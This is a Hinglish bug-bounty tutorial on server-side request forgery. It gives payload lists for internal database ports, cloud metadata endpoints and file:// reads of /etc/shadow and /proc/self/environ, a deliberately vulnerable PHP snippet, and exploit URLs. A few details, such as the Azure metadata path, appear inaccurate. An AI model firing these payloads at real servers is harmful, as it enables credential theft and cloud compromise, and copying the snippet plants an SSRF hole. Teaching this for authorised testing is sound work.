# 💉 SSRF (Server-Side Request Forgery) — Complete Guide

> **Level:** Advanced | **Time:** 5-6 hours | **Difficulty:** ⭐⭐⭐

---

## 📖 Kya Hai SSRF?

**SSRF = Server ko apni taraf se request bhejvana!**

```
Normal Flow:
User → Server → Internet

SSRF Flow:
User → Server → Internal Network
          ↓
      127.0.0.1:6379 (Redis)
      127.0.0.1:3306 (MySQL)
      192.168.x.x (Internal)
      Cloud Metadata (/var/run/secrets/)
```

---

## 3️⃣ Types of SSRF

### 1. **Blind SSRF**
- No output visible
- But request executed
- Timing or OOB detection needed

### 2. **Information-Leaking SSRF**
- Response visible
- Data extraction possible
- Easier to exploit

### 3. **Time-Based SSRF**
- Timing differences detect
- Slow response = success

---

## 💣 Payloads

### Internal Services
```
http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:3306/  (MySQL)
http://127.0.0.1:5432/  (PostgreSQL)
http://127.0.0.1:27017/ (MongoDB)
http://127.0.0.1:8080/
http://localhost:9000/
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/  (AWS)
http://metadata.google.internal/  (GCP)
http://169.254.169.254/metadata/v1/  (Azure)
```

### File Access
```
file:///etc/passwd
file:///etc/shadow
file:///var/www/html/config.php
file:///proc/self/environ
```

---

## 🧪 Real Example

**Vulnerable Code:**
```php
$image_url = $_GET['image'];
$image = file_get_contents($image_url);
echo $image;
```

**Exploit:**
```
http://target.com/display?image=http://127.0.0.1:6379/
Response: Redis data!

http://target.com/display?image=file:///etc/passwd
Response: /etc/passwd contents!

http://target.com/display?image=http://169.254.169.254/latest/meta-data/
Response: AWS credentials!
```

---

## ✅ Checklist

- [ ] SSRF types samjhe
- [ ] Payloads tested
- [ ] Internal network mapped
- [ ] Cloud metadata accessed
- [ ] Real bugs found
- [ ] Critical vulnerabilities!

---

## 💰 Bounty

**SSRF = $2,000-$10,000+ bounties!**

Kyun? Kyunki ye leading to:
- Database access
- Credential theft
- Cloud infrastructure breach
- Critical data exposure

---

**Next:** More advanced vulnerabilities! 🚀